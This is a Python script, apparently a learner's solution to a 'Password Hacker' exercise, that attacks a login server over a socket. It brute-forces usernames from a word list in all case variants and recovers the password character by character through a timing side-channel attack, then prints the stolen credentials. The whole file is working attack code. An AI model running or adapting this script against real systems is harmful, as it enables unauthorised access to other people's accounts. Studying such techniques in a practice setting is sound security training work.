import socket
import sys
import string
import itertools
import json
from datetime import datetime

# def generate_password(i):
#     for item in itertools.product(symbols, repeat=i):
#         yield item

def read_from_file(pass_file):
    for line in open(pass_file):
        yield line

args = sys.argv
IP_address = args[1]
port = args[2]
port = int(port)

#
# # Create a new socket.
client_socket = socket.socket()

# # Connect to a host and a port using the socket.
client_socket.connect((IP_address, port))

login_found = False
# pass_file = 'passwords.txt'
log_file = 'C:\\Users\\tiger\\PycharmProjects\\Password Hacker1\\Password Hacker\\task\\hacking\\logins.txt'
lines = read_from_file(log_file)
while not login_found:
    try:
        line = next(lines).strip('\n')
        logins_list = list(map(''.join, itertools.product(*((letter.upper(), letter.lower()) for letter in line))))
        for item in logins_list:
            try:
                # print(item)
                msg = ''.join(item)
                if len(msg) == 0:
                    break
                # print(msg)
                # b_msg = msg.encode()
                msg_dict = {'login' : msg, 'password' : ' '}
                json_msg = json.dumps(msg_dict)
                client_socket.send(json_msg.encode())
                # Receive the server’s response.
                resp = client_socket.recv(1024)
                # resp = resp.decode()
                resp = json.loads(resp)
                # Print the server’s response
                if resp['result'] == "Wrong password!":
                    login_found = True
                    login = msg
                    break
            except:
                pass
    except StopIteration:
        pass

# # Send a message from the third command line argument to the host using the socket.
pass_found = False
# pass_file = 'passwords.txt'
# pass_file = 'C:\\Users\\tiger\\PycharmProjects\\Password Hacker1\\Password Hacker\\task\\hacking\\passwords.txt'
# lines = read_from_file(pass_file)
symbols_low = string.ascii_letters
symbols_num = string.digits
symbols = symbols_low + symbols_num
pswrd =''

# print(login)
# print(symbols)
while not pass_found:
    try:
        dict_pass = {}
        # line = next(lines).strip('\n')
        # pass_list = list(map(''.join, itertools.product(*((letter.upper(), letter.lower()) for letter in line))))
        for item in symbols:
            try:
                # print(item)
                msg = pswrd + item
                # print(msg)
                if len(msg) == 0:
                    break
                # print(msg)
                # b_msg = msg.encode()
                msg_dict = {'login': login, 'password': msg}
                json_msg = json.dumps(msg_dict)
                client_socket.send(json_msg.encode())
                send_time = datetime.now()
                # print(send_time)
                # Receive the server’s response.
                resp = client_socket.recv(1024)
                resp_time = datetime.now()
                # print(resp_time)
                dif = (resp_time - send_time).total_seconds()
                dict_pass[item] = dif
                resp = resp.decode()
                resp = json.loads(resp)
                # Print the server’s response
                # if resp['result'] == "Exception happened during login":
                #     pswrd += item
                if resp['result'] == "Connection success!":
                    pass_found = True
                    pswrd += item
                    break
            except:
                pass
        if not pass_found:
            max_dif = max(dict_pass.values())
            # print(dict_pass)
            for key in dict_pass.keys():
                if dict_pass[key] == max_dif:
                    pswrd += key
             # print('current ' + pswrd)
    except StopIteration:
        pass

credentials = {'login': login , 'password': pswrd }
print(json.dumps(credentials))
# Close the socket.
client_socket.close()

